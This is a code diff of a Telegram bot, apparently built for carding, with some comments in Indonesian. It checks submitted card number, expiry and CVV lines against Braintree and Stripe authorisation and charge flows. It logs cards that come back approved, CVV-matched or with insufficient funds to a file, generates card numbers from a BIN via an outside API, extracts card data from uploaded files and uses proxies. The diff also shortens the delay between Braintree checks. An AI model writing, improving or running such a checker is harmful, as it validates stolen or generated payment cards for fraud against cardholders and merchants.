+                if "Gateway Rejected: risk_threshold" in error_msg:
+                    response = "Gateway Rejected - Risk_threshold ❌"
+                    error_msg = ""
+                else:
+                    response = "Approved ✅"
+        
+                if error_msg:
+                    output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
+                              f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
+                              f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg} ❌\n"
+                              f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                              f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                              f"𝗕𝗮𝗻𝗸 ➯ <b>{bank}</b>\n")
+                else:
+                    output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
+                              f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
+                              f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n"
+                              f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                              f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                              f"𝗕𝗮𝗻𝗸 ➯ <b>{bank}</b>\n")
+                    
+                    if response in ["Approved ✅", "CVV INCORRECT ❎", "CVV MATCH ✅", "INSUFFICIENT FUNDS ✅"]:
+                        with open("auth.txt", "a", encoding="utf-8") as f:
+                            f.write(output + "\n")
+                
+                return output
     
     @staticmethod
     async def start_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1062,12 +1424,11 @@ class BraintreeAuth:
             msg = await update.callback_query.edit_message_text(
                 "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
             )
-    
         else:
             msg = await update.message.reply_text(
                 "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
             )
-    
+
 async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
     
@@ -1094,7 +1455,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
                 await asyncio.sleep(3)
                 result = await StripeAuth.multi_checking(card)
             elif mode == 'braintree':
-                await asyncio.sleep(20)
+                await asyncio.sleep(3)
                 result = await BraintreeAuth.multi_checking(card)
             elif mode == 'stripe_charge':
                 await asyncio.sleep(20)
@@ -1113,6 +1474,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         await msg.delete()
     except Exception as e:
         await update.message.reply_text(f"ERROR: {str(e)}")
+
 API_URL = "https://drlabapis.onrender.com/api/ccgenerator"
 def parse_input(input_text):
     input_text = input_text.strip()
@@ -1123,6 +1485,7 @@ def parse_input(input_text):
         input_text = " ".join(parts_space[:-1])
     bin_input = input_text
     return bin_input, count
+
 async def ccgen_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
@@ -1137,7 +1500,7 @@ async def ccgen_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
         r = requests.get(API_URL, params=params)
         if r.status_code == 200:
             raw_ccs = r.text.strip().split('\n')
-            message_lines = ["🃏 𝗖𝗔𝗥𝗗𝗦 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 🃏\n"]
+            message_lines = [""]
             message_lines.append("```")
             message_lines.extend(raw_ccs)
             message_lines.append("```")
@@ -1149,8 +1512,10 @@ async def ccgen_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
     except Exception as e:
         await update.message.reply_text(f"⚠️ Terjadi kesalahan: {str(e)}")
+
 async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await ccgen_advanced(update, context)
+
 def extract_cc_from_line(line):
     pattern = re.compile(
         r"(\d{15,16})\|"
@@ -1159,6 +1524,7 @@ def extract_cc_from_line(line):
         r"(\d{3,4})"
     )
     return [match.group(0) for match in pattern.finditer(line)]
+
 def extract_cc_from_file(input_file, output_file):
     results = []
     with open(input_file, "r", encoding="utf-8") as f:
@@ -1169,6 +1535,7 @@ def extract_cc_from_file(input_file, output_file):
         for item in results:
             f.write(item + "\n")
     return len(results)
+
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     file = update.message.document
     os.makedirs("downloads", exist_ok=True)
@@ -1183,6 +1550,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         await update.message.reply_text(f"{count} CARDS HAVE BEEN SUCCESSFULLY EXTRACTED AND SENT")
     else:
         await update.message.reply_text("NO MATCHING CARDS DATA FOUND")
+
 async def edit_to_menu(update: Update, text: str, reply_markup: InlineKeyboardMarkup) -> None:
     """Fungsi helper untuk mengedit pesan yang aktif menjadi menu baru"""
     try:
@@ -1208,6 +1576,7 @@ async def edit_to_menu(update: Update, text: str, reply_markup: InlineKeyboardMa
                 text=text,
                 reply_markup=reply_markup
             )
+
 async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     keyboard = [
         [InlineKeyboardButton("ADD ADMIN", callback_data='addadmin')],
@@ -1218,6 +1587,7 @@ async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     text = "𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨\n\n"
     
     await edit_to_menu(update, text, reply_markup)
+
 async def add_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
     await query.answer()
@@ -1241,6 +1611,7 @@ async def add_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
     
     context.user_data['awaiting_admin_id'] = True
+
 async def del_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
     await query.answer()
@@ -1264,6 +1635,7 @@ async def del_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
     
     context.user_data['awaiting_admin_removal'] = True
+
 async def handle_admin_id_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
     
@@ -1326,8 +1698,10 @@ async def handle_admin_id_input(update: Update, context: ContextTypes.DEFAULT_TY
         
         del context.user_data['awaiting_admin_removal']
         await show_admin_menu(update, context)
+
 async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await show_admin_menu(update, context)
+
 # --- INTERACTIVE MENU ---
 def build_menu_keyboard():
     keyboard = [
@@ -1345,6 +1719,7 @@ def build_menu_keyboard():
         keyboard.insert(2, [InlineKeyboardButton("ADMIN", callback_data='admin')])
     
     return InlineKeyboardMarkup(keyboard)
+
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
     await query.answer()
@@ -1359,7 +1734,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV",
             reply_markup=reply_markup
         )
-
     elif query.data == 'ba':
         active_mode_per_chat[chat_id] = 'braintree'
         keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
@@ -1368,7 +1742,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV",
             reply_markup=reply_markup
         )
-
     elif query.data == 'sc':
         active_mode_per_chat[chat_id] = 'stripe_charge'
         keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
@@ -1377,7 +1750,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗖𝗡\nSEND CARDS ➯ CC|MM|YY|CVV",
             reply_markup=reply_markup
         )
-
     elif query.data == 'gen':
         keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1386,7 +1758,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "/gen 550230 5",
             reply_markup=reply_markup
         )
-
     elif query.data == 'clean':
         keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1395,7 +1766,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "SEND A FILE TO EXTRACT CC",
             reply_markup=reply_markup
         )
-
     elif query.data == 'admin':
         # Hanya admin yang bisa mengakses ini
         if chat_id not in admin_chat_ids:
@@ -1412,7 +1782,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨\n\n",
             reply_markup=reply_markup
         )
-
     elif query.data == 'help':
         keyboard = [[InlineKeyboardButton("BACK", callback_data='back')]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1424,7 +1793,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "𝗖𝗖 𝗖𝗟𝗘𝗔𝗡𝗘𝗥 ➯ EXTRACT CARDS\n"
         )
         msg = await query.edit_message_text(help_text, reply_markup=reply_markup)
-
     elif query.data == 'addadmin':
         await add_admin_callback(update, context)
     elif query.data == 'deladmin':
@@ -1451,6 +1819,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
     
     await handle_cc_message(update, context)
+
 async def checker_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     keyboard = build_menu_keyboard()
     await update.message.reply_text(
@@ -1459,6 +1828,7 @@ async def checker_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         parse_mode="Markdown",
         disable_web_page_preview=True
     )
+
 if __name__ == "__main__":
     import sys
     proxy_list = load_proxies_from_file()
